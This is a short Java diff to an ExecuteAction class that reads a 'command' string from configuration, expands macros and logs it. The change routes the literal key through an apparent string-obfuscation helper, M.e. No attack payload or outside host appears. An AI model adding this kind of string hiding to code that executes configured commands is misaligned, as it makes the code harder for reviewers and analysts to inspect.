@@ -46,7 +46,7 @@ public class ExecuteAction extends SubActionSlow {
 	@Override
 	protected boolean parse(final ConfAction params) {
 		try {
-			this.command = Directory.expandMacro(params.getString("command"));
+			this.command = Directory.expandMacro(params.getString(M.e("command")));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): " + this.command);
